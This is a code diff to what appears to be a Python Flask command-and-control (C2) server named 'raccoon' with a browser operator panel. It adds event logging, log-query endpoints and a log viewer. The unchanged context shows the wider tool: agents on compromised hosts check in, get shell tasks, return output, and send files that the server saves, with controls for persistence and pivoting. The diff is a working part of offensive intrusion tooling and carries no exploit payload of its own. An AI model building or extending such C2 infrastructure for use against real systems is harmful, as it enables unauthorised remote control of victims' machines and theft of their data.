@@ -29,6 +29,8 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from flask import Flask, request, jsonify, send_from_directory, Response
 
 logger = logging.getLogger("raccoon.c2.server")
+server_log = logging.getLogger("raccoon.c2.events")
+agent_log = logging.getLogger("raccoon.c2.agents")
 
 # ── Shared constants (must match beacon.py) ──
 
@@ -113,6 +115,7 @@ task_queues: dict[str, list] = {}
 results: dict[str, dict] = {}
 history: dict[str, list] = {}
 scan_store: dict[str, list] = {}
+event_log: list[dict] = []
 _name_counter = 0
 
 
@@ -126,6 +129,43 @@ def _assign_name() -> str:
 
 def _now() -> str:
     return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
+
+
+def _setup_file_logging(data_dir: Path):
+    log_dir = data_dir / "logs"
+    log_dir.mkdir(parents=True, exist_ok=True)
+
+    fmt = logging.Formatter("%(asctime)s  %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+
+    srv_handler = logging.FileHandler(log_dir / "server.log", encoding="utf-8")
+    srv_handler.setFormatter(fmt)
+    server_log.addHandler(srv_handler)
+    server_log.setLevel(logging.INFO)
+
+    agt_handler = logging.FileHandler(log_dir / "agents.log", encoding="utf-8")
+    agt_handler.setFormatter(fmt)
+    agent_log.addHandler(agt_handler)
+    agent_log.setLevel(logging.INFO)
+
+
+def _log_event(category: str, message: str, agent_id: str = "",
+               details: Optional[dict] = None):
+    entry = {
+        "ts": _now(),
+        "cat": category,
+        "msg": message,
+        "agent": agent_id,
+    }
+    if details:
+        entry["details"] = details
+    event_log.append(entry)
+    if len(event_log) > 5000:
+        del event_log[:1000]
+
+    if agent_id:
+        agent_log.info("[%s] [%s] %s", agent_id, category, message)
+    server_log.info("[%s] %s%s", category, message,
+                    f" (agent={agent_id})" if agent_id else "")
 
 
 def _save_state(data_dir: Path):
@@ -248,6 +288,8 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             "status": "pending",
             "output": None,
         })
+        _log_event("TASK", f"cmd={task['cmd']} args={task.get('args','')} "
+                   f"task_id={task['id']}", agent_id=agent_id)
         return jsonify(task)
 
     @app.route("/api/agents/<agent_id>/history", methods=["GET"])
@@ -276,6 +318,25 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         if task_id in results:
             return jsonify(results[task_id])
         return jsonify({"status": "pending"})
+
+    # ── Logs API ──
+
+    @app.route("/api/logs/server", methods=["GET"])
+    @require_auth
+    def api_logs_server():
+        limit = request.args.get("limit", 200, type=int)
+        cat = request.args.get("cat", "")
+        entries = event_log
+        if cat:
+            entries = [e for e in entries if e["cat"] == cat.upper()]
+        return jsonify(entries[-limit:])
+
+    @app.route("/api/logs/agent/<agent_id>", methods=["GET"])
+    @require_auth
+    def api_logs_agent(agent_id):
+        limit = request.args.get("limit", 200, type=int)
+        entries = [e for e in event_log if e.get("agent") == agent_id]
+        return jsonify(entries[-limit:])
 
     # ── Server config API ──
 
@@ -360,6 +421,9 @@ def _handle_register(payload: dict, crypto: ServerCrypto):
             })
             resp = crypto.wrap({"success": True, "agent_id": aid})
             logger.info("Agent re-registered: %s (%s)", aid, payload.get("hostname"))
+            _log_event("RECONNECT", f"{payload.get('user', '?')}@{payload.get('hostname', '?')} "
+                       f"pid={payload.get('pid')} os={payload.get('os', '?')}",
+                       agent_id=aid)
             return jsonify(resp)
 
     agent_id = _assign_name()
@@ -383,6 +447,9 @@ def _handle_register(payload: dict, crypto: ServerCrypto):
 
     logger.info("New agent registered: %s (%s @ %s)",
                 agent_id, payload.get("user"), payload.get("hostname"))
+    _log_event("REGISTER", f"New agent {payload.get('user', '?')}@{payload.get('hostname', '?')} "
+               f"os={payload.get('os', '?')} arch={payload.get('arch', '?')} pid={payload.get('pid')}",
+               agent_id=agent_id)
 
     resp = crypto.wrap({"success": True, "agent_id": agent_id})
     return jsonify(resp)
@@ -412,6 +479,8 @@ def _handle_beacon(payload: dict, crypto: ServerCrypto):
             task["dispatched"] = _now()
             logger.info("Dispatching task %s (%s) to %s",
                         task["id"], task["cmd"], agent_id)
+            _log_event("DISPATCH", f"cmd={task['cmd']} args={task.get('args','')} "
+                       f"task_id={task['id']}", agent_id=agent_id)
             resp = crypto.wrap(task)
             return jsonify(resp)
 
@@ -448,6 +517,15 @@ def _handle_result(payload: dict, crypto: ServerCrypto, data_dir: Path):
     logger.info("Result from %s task %s: %s (%d bytes)",
                 agent_id, task_id, status, len(output))
 
+    cmd_name = ""
+    if agent_id in history:
+        for entry in history[agent_id]:
+            if entry.get("task_id") == task_id:
+                cmd_name = entry.get("cmd", "")
+                break
+    _log_event("RESULT", f"cmd={cmd_name} task_id={task_id} status={status} "
+               f"output_len={len(output)}", agent_id=agent_id)
+
     _save_state(data_dir)
 
     if data and data.get("data"):
@@ -456,6 +534,8 @@ def _handle_result(payload: dict, crypto: ServerCrypto, data_dir: Path):
         filename = data.get("filename", f"{task_id}.bin")
         (dl_dir / filename).write_bytes(base64.b64decode(data["data"]))
         logger.info("Downloaded file saved: %s/%s", agent_id, filename)
+        _log_event("DOWNLOAD", f"file={filename} saved to {dl_dir / filename}",
+                   agent_id=agent_id)
 
     return jsonify(crypto.wrap({"ack": True}))
 
@@ -906,6 +986,36 @@ header .info{font-size:11px;color:var(--text2)}
   padding:4px 8px;margin:3px 0;border-radius:2px;
 }
 
+/* Log viewer */
+.log-controls{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;flex-shrink:0}
+.log-controls button,.log-controls select{
+  padding:4px 10px;background:rgba(255,255,255,0.04);color:var(--text);
+  border:1px solid var(--border);border-radius:4px;font-size:11px;cursor:pointer;
+  font-family:var(--sans);transition:all 0.15s;
+}
+.log-controls button:hover{background:rgba(255,26,26,0.15);border-color:var(--red-dim);color:var(--red)}
+.log-controls button.active{background:rgba(255,26,26,0.2);border-color:var(--red);color:var(--red)}
+.log-entry{
+  display:flex;gap:8px;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);
+  font-size:11px;line-height:1.5;font-family:var(--mono);
+}
+.log-entry:hover{background:rgba(255,255,255,0.02)}
+.log-ts{color:var(--text2);white-space:nowrap;flex-shrink:0;width:140px}
+.log-cat{
+  padding:1px 6px;border-radius:3px;font-size:10px;font-weight:700;
+  text-transform:uppercase;white-space:nowrap;flex-shrink:0;min-width:70px;text-align:center;
+}
+.log-cat.REGISTER{background:rgba(51,255,51,0.12);color:#33ff33}
+.log-cat.RECONNECT{background:rgba(51,200,255,0.12);color:#33ccff}
+.log-cat.TASK{background:rgba(255,215,0,0.12);color:#ffd700}
+.log-cat.DISPATCH{background:rgba(255,165,0,0.12);color:#ffaa33}
+.log-cat.RESULT{background:rgba(85,136,204,0.12);color:#5588cc}
+.log-cat.DOWNLOAD{background:rgba(187,102,204,0.12);color:#bb66cc}
+.log-cat.STARTUP{background:rgba(255,26,26,0.12);color:var(--red)}
+.log-cat.ERROR{background:rgba(255,50,50,0.15);color:#ff5555}
+.log-agent{color:var(--green);white-space:nowrap;flex-shrink:0}
+.log-msg{color:var(--text);word-break:break-all;flex:1}
+
 /* Scrollbar */
 .agent-list::-webkit-scrollbar{width:4px}
 .agent-list::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px}
@@ -1129,6 +1239,8 @@ async function renderAgentView(id){
         <button onclick="quickCmd('shell','netstat -tlnp 2>/dev/null || netstat -an','Network')"><span class="ico">&#127760;</span> netstat</button>
         <button onclick="showBeaconConfig()"><span class="ico">&#9881;</span> Beacon</button>
         <button onclick="showPivotMap()"><span class="ico">&#127760;</span> Pivot Map</button>
+        <button onclick="showServerLog()"><span class="ico">&#128220;</span> Server Log</button>
+        <button onclick="showAgentLog()"><span class="ico">&#128196;</span> Agent Log</button>
         <button onclick="showHelp()"><span class="ico">&#10067;</span> Help</button>
       </div>
       <div class="terminal-split">
@@ -1282,6 +1394,7 @@ function closePanel(){
   document.getElementById("side-panel").classList.remove("open");
   fbVisible = false;
   if(panelPollTimer){ clearInterval(panelPollTimer); panelPollTimer=null; }
+  if(logPollTimer){ clearInterval(logPollTimer); logPollTimer=null; }
   stopPivotAnim();
 }
 
@@ -1617,6 +1730,88 @@ function removePersist(){
   const method = document.getElementById("cfg-persist-method").value;
   quickCmd("unpersist", method, "Unpersist");
   toast("warning","Persistence","Removing via "+method+"...",3000);
+}
+
+// ── Log viewers ──
+let logPollTimer = null;
+let logFilter = "";
+
+function renderLogEntries(entries, container){
+  container.innerHTML = entries.map(e => {
+    const ts = (e.ts||"").replace("T"," ").replace("Z","");
+    return '<div class="log-entry">'
+      + '<span class="log-ts">'+esc(ts)+'</span>'
+      + '<span class="log-cat '+esc(e.cat||"")+'">'+esc(e.cat||"?")+'</span>'
+      + (e.agent ? '<span class="log-agent">'+esc(e.agent)+'</span>' : '')
+      + '<span class="log-msg">'+esc(e.msg||"")+'</span>'
+      + '</div>';
+  }).join("") || '<div style="color:var(--text2);padding:20px;text-align:center">No log entries yet</div>';
+  container.scrollTop = container.scrollHeight;
+}
+
+async function showServerLog(){
+  if(logPollTimer){ clearInterval(logPollTimer); logPollTimer=null; }
+  logFilter = "";
+  openPanel("Server Log", `
+    <div class="log-controls">
+      <button class="active" onclick="setLogFilter('')">All</button>
+      <button onclick="setLogFilter('REGISTER')">Register</button>
+      <button onclick="setLogFilter('RECONNECT')">Reconnect</button>
+      <button onclick="setLogFilter('TASK')">Task</button>
+      <button onclick="setLogFilter('DISPATCH')">Dispatch</button>
+      <button onclick="setLogFilter('RESULT')">Result</button>
+      <button onclick="setLogFilter('DOWNLOAD')">Download</button>
+      <button onclick="setLogFilter('STARTUP')">Startup</button>
+      <span style="flex:1"></span>
+      <button onclick="refreshServerLog()">&#8635; Refresh</button>
+    </div>
+    <div id="log-entries" style="flex:1;overflow-y:auto;min-height:0"></div>
+  `);
+  refreshServerLog();
+  logPollTimer = setInterval(refreshServerLog, 5000);
+}
+
+async function refreshServerLog(){
+  const url = "/api/logs/server" + (logFilter ? "?cat="+logFilter : "");
+  const entries = await api(url);
+  const container = document.getElementById("log-entries");
+  if(container) renderLogEntries(entries, container);
+}
+
+function setLogFilter(cat){
+  logFilter = cat;
+  document.querySelectorAll(".log-controls button").forEach(b => {
+    const isCat = (cat === "" && b.textContent === "All") ||
+                  b.textContent.toUpperCase() === cat;
+    b.classList.toggle("active", isCat);
+  });
+  refreshServerLog();
+}
+
+async function showAgentLog(){
+  if(logPollTimer){ clearInterval(logPollTimer); logPollTimer=null; }
+  if(!selectedAgent){
+    toast("warn","Log","Select an agent first",3000);
+    return;
+  }
+  const agentName = selectedAgent;
+  openPanel("Agent Log: " + agentName, `
+    <div class="log-controls">
+      <span style="color:var(--green);font-weight:700;font-size:12px">` + esc(agentName) + `</span>
+      <span style="flex:1"></span>
+      <button onclick="refreshAgentLog()">&#8635; Refresh</button>
+    </div>
+    <div id="log-entries" style="flex:1;overflow-y:auto;min-height:0"></div>
+  `);
+  refreshAgentLog();
+  logPollTimer = setInterval(refreshAgentLog, 5000);
+}
+
+async function refreshAgentLog(){
+  if(!selectedAgent) return;
+  const entries = await api("/api/logs/agent/"+selectedAgent);
+  const container = document.getElementById("log-entries");
+  if(container) renderLogEntries(entries, container);
 }
 
 // ── Pivot map ──
@@ -2687,6 +2882,9 @@ def main():
     data_dir.mkdir(parents=True, exist_ok=True)
 
     _load_state(data_dir)
+    _setup_file_logging(data_dir)
+    _log_event("STARTUP", f"Server starting on {'https' if args.ssl else 'http'}://"
+               f"{args.host}:{args.port}")
 
     srv_config = {
         "host": args.host,
